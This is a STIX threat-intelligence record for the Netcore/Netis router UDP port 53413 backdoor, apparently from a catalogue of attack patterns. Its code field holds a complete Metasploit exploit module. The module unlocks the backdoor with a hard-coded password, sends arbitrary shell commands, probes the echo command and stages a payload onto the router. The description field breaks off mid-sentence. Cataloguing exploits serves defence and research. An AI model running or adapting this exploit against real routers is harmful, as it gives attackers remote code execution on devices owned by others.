{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ba133e9-e5a8-4736-b7f3-0be4455ad1c0",
    "created": "2024-08-14T16:57:21.951696Z",
    "modified": "2024-08-14T16:57:21.9517Z",
    "name": "Netcore Router Udp 53413 Backdoor",
    "description": " Routers manufactured by Netcore, a popular brand for networking equipment in China, have a wide-open backdoor that can be fairly easily exploited by attackers. These products are also sold under the Netis brand name outside of China. This backdoor allows cyber criminals to easily run arbitrary code on these routers rendering it vulnerable as a security device. Some models include a non-standard echo command which doesn't honor -e, and are therefore not currently exploitable with",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/netcore_udp_53413_backdoor.rb",
            "external_id": "netcore_udp_53413_backdoor.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.seebug.org/vuldb/ssvid-90227"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/h00die/MSF-Testing-Scripts/blob/master/netis_backdoor.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Netcore Router Udp 53413 Backdoor',\n      'Description'     => %q{\n        Routers manufactured by Netcore, a popular brand for networking\n        equipment in China, have a wide-open backdoor that can be fairly\n        easily exploited by attackers. These products are also sold under\n        the Netis brand name outside of China. This backdoor allows\n        cyber criminals to easily run arbitrary code on these routers,\n        rendering it vulnerable as a security device.\n        Some models include a non-standard echo command which doesn't\n        honor -e, and are therefore not currently exploitable with\n        Metasploit.  See URLs or module markdown for additional options.\n      },\n      'Author'          =>\n        [\n          'Nixawk',\n          'h00die <mike@shorebreaksecurity.com>'\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'URL', 'https://www.seebug.org/vuldb/ssvid-90227' ],\n          [ 'URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/' ],\n          [ 'URL', 'https://github.com/h00die/MSF-Testing-Scripts/blob/master/netis_backdoor.py']\n        ],\n      'Privileged'      => true,\n      'Targets'         =>\n        [\n          ['MIPS Little Endian',\n           {\n             'Platform' => 'linux',\n             'Arch'     => ARCH_MIPSLE\n           }\n          ],\n          ['MIPS Big Endian',\n           {\n             'Platform' => 'linux',\n             'Arch'     => ARCH_MIPSBE\n           }\n          ]\n        ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2014-08-25'))\n\n    register_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'The socket response timeout in milliseconds', 1000]),\n        Opt::RPORT(53413)\n      ])\n  end\n\n  def timeout\n    (datastore['TIMEOUT'] || 1000) / 1000.0\n  end\n\n  def send_command(data)\n    payload = \"\\x00\" * 8\n    payload << data\n    udp_sock.put(payload)\n  end\n\n  def execute_command(cmd, _opts)\n    send_command(cmd)\n    vprint_status(\"Sending: #{cmd}\")\n  end\n\n  def authenticate()\n    # netcore is the password to unlock the backdoor\n    send_command('netcore')\n    resp = udp_sock.get(timeout)\n    if resp.include?('Login succeeded!')\n      vprint_good('Backdoor Unlocked')\n    end\n  end\n\n  def check\n    connect_udp\n    authenticate\n    resp = []\n    tmp_file = Rex::Text.rand_text_alpha(5)\n    # we need to test the echo command to see if it plays nice\n    [\"echo -en #{tmp_file} > /tmp/#{tmp_file}\", \"cat /tmp/#{tmp_file}\"].each do |command|\n      send_command(command)\n      resp << udp_sock.get(timeout)\n    end\n    disconnect_udp\n    resp_str = resp.join(',')\n    # check if we got a good response back\n    if resp.length >= 1 && resp_str.include?(\"\\x00\\x00\\x00\\x05\") && resp_str.include?(tmp_file)\n      # some routers have a non-standard echo which doesn't support -en, so we need to detect that\n      if resp_str.include?('en ')\n        print_status('Router backdoor triggered, but non-exploitable echo command detected.  Not currently exploitable with Metasploit.')\n        Exploit::CheckCode::Detected\n      else\n        Exploit::CheckCode::Vulnerable\n      end\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status('Exploiting...')\n    connect_udp\n    authenticate\n    execute_cmdstager(:flavor => :echo, :linemax => 200)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-08-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}